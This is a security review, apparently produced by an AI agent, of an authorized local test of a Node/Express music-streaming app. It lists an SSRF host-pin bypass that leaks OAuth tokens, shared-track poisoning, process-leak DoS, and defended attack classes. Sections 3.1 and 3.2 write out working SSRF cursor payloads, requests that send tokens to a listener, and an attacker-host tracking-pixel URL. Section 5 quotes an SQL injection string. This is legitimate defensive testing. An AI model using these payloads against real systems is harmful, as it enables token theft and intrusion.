# Music Manager — Security Review, 2026-11-08

Authorized offensive-security test of the owner's own Music Manager app
(Node/Express backend + React client + Tauri shell), against `main` @ `8bf79e4`.
All dynamic testing ran against a disposable local instance on `127.0.0.1`.

## 1. Summary

- Tested the full HTTP API dynamically (auth/JWT, IDOR, SQL/argument/path
  injection, SSRF, DoS, info-disclosure, CORS, rate limits) plus a static review
  of the SoundCloud/Google token handling, cache/transcode pipeline, yt-dlp &
  ffmpeg spawning, and the Tauri config.
- **4 confirmed** vulnerabilities, **3 potential**, and a broad set of
  **successfully defended** attack classes (SQLi, IDOR, path traversal, argument
  injection, CORS, rate limiting).
- The single most urgent item is a **server-side request forgery that also
  exfiltrates the SoundCloud OAuth token** (`soundcloud-cursor-ssrf-token-exfil`):
  the search `cursor` host-pin is bypassable and the server attaches its OAuth
  bearer token when it follows the attacker's URL.
- Highest-impact data issue: any logged-in user can **poison the shared `tracks`
  metadata** (title/artist/thumbnail) seen in every other user's playlists and
  history.
- Reliability: both the **yt-dlp resolver and the ffmpeg transcoder keep running
  after the client disconnects** on the unauthenticated media endpoints, a
  cheap DoS lever.

## 2. Assumptions

- Target booted by this agent: `node server.js` on `PORT=3999` with a random
  32-byte hex `JWT_SECRET`, `YTDLP_AUTO_UPDATE=false`, and SoundCloud/Google
  credentials unset. `GET /` confirmed it was up.
- The real `yt-dlp` binary is not present and the environment is offline, so a
  **local stub** `bin/yt-dlp_macos` was used that logs its argv and (optionally)
  prints a `127.0.0.1` URL. `ffmpeg` is the system binary (`FFMPEG_BIN=/usr/bin/ffmpeg`).
  This lets the spawn/argument/orphaned-process behaviour be tested without any
  external network calls. The stub was removed afterwards.
- SoundCloud is credential-free by default, so the SSRF/token tests used a
  **second instance on `127.0.0.1:3998` with `SOUNDCLOUD_PROVIDER=api` and
  fake tokens seeded into the local SQLite DB** (`FAKE-APP-TOKEN...`,
  `FAKE-BOB-USER-TOKEN...` — never real secrets). A local capture listener on
  `127.0.0.1:4999` stood in for the "arbitrary host".
- Skipped (out of scope): any request to real SoundCloud/Google/YouTube hosts,
  the Tauri desktop build itself (reviewed statically only), and `npm`'s
  ffmpeg-static download (blocked by the proxy; system ffmpeg used instead).
- Throwaway accounts `sec_alice_tmp` / `sec_bob_tmp` were created and the test
  DB (`database.sqlite`) was deleted at the end; tracked `*.sqlite-shm/-wal`
  were restored, and the working tree is clean.

## 3. Confirmed vulnerabilities

### 3.1 SSRF + OAuth token exfiltration via the SoundCloud search cursor — HIGH
`controllers/soundcloud/client.js:226-243` (`buildUrl`), reached from
`controllers/soundcloudController.js:217-253` (`searchTracks`).

`buildUrl` decides whether a cursor is an absolute URL with
`/^https?:\/\//i.test(pathOrUrl)`. Only values containing the literal `://` are
host-pinned to `api.soundcloud.com`; everything else is passed to
`new URL(value, API_BASE)`, which still resolves many absolute-but-oddly-written
forms to an attacker-chosen host:

```
"https://evil.example/x"           -> THROWS BAD_CURSOR   (pinned, good)
"http:127.0.0.1:4999/x"            -> http://127.0.0.1:4999/x    (BYPASS)
"http:/127.0.0.1/x"                -> http://127.0.0.1/x         (BYPASS)
" http://evil/x" / "ht\ttp://.."   -> http://evil/x              (BYPASS)
"//evil/x"                         -> https://evil/x             (BYPASS)
```

In API mode the server then fetches that URL **with its SoundCloud OAuth token
in the `Authorization: OAuth ...` header**. Against the local capture listener:

```
GET /api/soundcloud/search?q=x&cursor=http:127.0.0.1:4999/alice-app-token
  -> 200, listener logged:
  GET /alice-app-token?linked_partitioning=true | authorization: OAuth FAKE-APP-TOKEN-local-test
# a connected user leaks their OWN token:
cursor=http:/127.0.0.1:4999/bob-user-token
  -> authorization: OAuth FAKE-BOB-USER-TOKEN-local-test
```

It also works as an internal port scanner (`http:127.0.0.1:1/closed` -> 502,
`http:127.0.0.1:3999/` -> 200). Any authenticated account can trigger it.
**Impact:** theft of the server's app token and any connected user's token, plus
SSRF to any host reachable from the server. Gated on SoundCloud API mode (in the
default yt-dlp mode the cursor is ignored — confirmed 200 with no fetch).

### 3.2 Cross-user poisoning of the shared `tracks` table — MEDIUM
`controllers/historyController.js:219-226`, `controllers/playlistController.js:432-439`.

`tracks` is `UNIQUE(source_id, external_id)` and written with `INSERT OR IGNORE`,
so whoever records an external id first owns its title/artist/thumbnail forever,
and every user's playlists/history JOIN that one row.

```
bob:   POST /history {trackId:"dQw4w9WgXcQ", title:"POISONED TITLE set by bob",
                      artist:"bob-controlled artist",
                      thumbnail:"https://attacker.invalid/track.gif?victim=pixel"} -> 200
alice: POST /api/custom-playlists/1/tracks {externalId:"dQw4w9WgXcQ",
                      title:"Never Gonna Give You Up", artist:"Rick Astley", ...} -> 201
alice: GET  /api/custom-playlists/1/tracks
  -> title "POISONED TITLE set by bob", image "https://attacker.invalid/track.gif?victim=pixel"
```

The thumbnail is an arbitrary URL the victim's browser loads (tracking pixel /
privacy leak). There is no per-field length cap below the 1 MB body limit, so a
900 KB title is accepted and served to everyone referencing that id.
**Impact:** cross-user data-integrity/spoofing and a victim-browser request lever.

### 3.3 yt-dlp resolver has no timeout and is not killed on disconnect — MEDIUM
`controllers/YouTubeController.js:34-47` (`streamTrack`), `:61-71` (`getDuration`).

These `execFile(ytDlpPath, ...)` calls pass **no `timeout`** and keep no handle
to kill the child on client disconnect (the `req.on('close')` logic in
`transcode.js` only covers the later ffmpeg phase). With a 120 s-sleeping stub,
8× `/stream` + 4× `/duration` aborted after 1 s left **12 yt-dlp processes still
alive** 3 s later. The endpoints are unauthenticated (only a 60/min IP limit),
so no account is needed. Note the other two yt-dlp call sites
(`services/ytdlp.js`, `controllers/soundcloud/ytdlp.js`) *do* set a timeout.

### 3.4 Unauthenticated /stream leaks ffmpeg transcodes after disconnect — MEDIUM
`app.js:100-101` (no `requireAuth`), `controllers/transcode.js:136-201`.

For a cacheable play (`seek=0`) the transcoder intentionally lets ffmpeg run to
completion after the client leaves, to finish the cache file. With a slow local
source, 6× `/stream` for distinct ids, each aborted after 2 s, left **6 ffmpeg
processes running** 4 s later, each writing a `.part` file. Only the 10-minute
`MAX_TRANSCODE_MS` bounds it. Because the route is unauthenticated and each
videoId is a separate cache key, this is a cheap resource-exhaustion lever. The
non-cacheable (`seek>0`) path correctly killed ffmpeg on disconnect.

## 4. Potential weaknesses

- **`prod-dependency-vulns` (HIGH):** `npm audit --omit=dev` (root) reports 1
  critical (proxy-addr), 2 high (body-parser DoS — the gzip-body path is
  reachable and was exercised; undici DoS via node-gyp), and 7 moderate, all
  with fixes available. The client's production tree is clean.
- **`tauri-csp-null-and-shell-allowlist` (MEDIUM):** `security.csp` is `null`
  (no CSP in the desktop webview) and the shell allowlist enables
  `execute`/`open` on top of the only-needed `sidecar`. Reviewed statically.
- **`jwt-verify-no-algorithm-pin` (LOW):** `jwt.verify` pins neither
  `algorithms` nor a required expiry. Not exploitable with the current symmetric
  secret (alg=none/wrong-secret/expired all rejected), but a token with no `exp`
  signed with the real secret is accepted and never expires.

## 5. Successfully defended

- **SQL injection** (`sql-injection-attempted`): all queries parameterized;
  login, playlist-id, source/sourceName and playlist-name payloads treated as
  literals; users table intact after `'); DROP TABLE users;--`.
- **IDOR** (`idor-playlists-history-attempted`): identity from the verified JWT;
  `assertPlaylistOwnership` (`id=? AND user_id=?`) blocks cross-user read/write;
  `x-user-id` / `?userId=` ignored.
- **Path traversal & argument injection** (`stream-path-traversal-attempted`):
  strict id/cache-key regexes, `cachePathFor` containment check, bounded integer
  seek, and a known-source allowlist; the yt-dlp argv log confirmed inputs only
  ever arrived as a single positional/URL argument, never as a flag.
- **AuthN** (`jwt-verify-no-algorithm-pin` evidence): `alg=none`, `alg=NONE`,
  wrong-secret, empty-secret, expired and tampered-payload tokens all 401; no
  token / malformed token / `Basic` scheme all 401; every protected route
  enforced auth.
- **CORS, headers, rate limits, error handling** (`cors-origin-restriction-info`):
  evil/`null` origins 403; helmet headers present; no `X-Powered-By`; baseline,
  media and auth limiters all fire; XFF/X-Real-IP spoof did not bypass; generic
  500s with no client-visible stack traces; constant-time login compare.

## 6. Dependency and static findings

- Root `npm audit --omit=dev`: `{critical:1, high:2, moderate:7}` — proxy-addr
  (critical, only relevant with `trust proxy`, which is off), body-parser
  (high, DoS, directly reachable), undici (high, via `sqlite3 > node-gyp`), plus
  qs/minimatch/ip-address/glob/gaxios/google-auth-library (moderate). All fixable
  by upgrade.
- Client `npm audit --omit=dev`: clean (0). Dev-only tooling (vite, zod,
  source-map-js, minimatch) has highs but is not shipped to users.
- Static notes already covered above: `buildUrl` scheme detection (3.1),
  `INSERT OR IGNORE` shared-track ownership (3.2), missing yt-dlp timeout and
  disconnect handling (3.3/3.4), Tauri `csp:null` + shell allowlist (§4),
  unvalidated OAuth `error` logged (`oauth-error-log-injection`, LOW —
  newline-injected forged log lines confirmed), and JWT verify options (§4).
- Good patterns observed: server-side-only OAuth tokens (client holds only the
  session JWT), single-use/single-flight refresh handling, PKCE verifier kept
  server-side, timing-safe login, and a central error handler that keeps stack
  traces out of responses.

## 7. Scope and safety

All dynamic traffic stayed on `127.0.0.1` (ports 3999/3998 for the app, 4998/4999
for local stand-ins). No request was sent to any external host or third-party
API; the yt-dlp binary was a local logging stub and the one simulated "arbitrary
host" was a loopback listener. Only throwaway local accounts and fake tokens were
used; no real secret appears in this report. Both server instances and all child
processes were stopped, the test database and `.part`/cache files were removed,
the temporary `bin/yt-dlp_macos` stub was deleted, the tracked SQLite WAL/SHM
files were restored, and `git status` is clean. No application source was
modified.
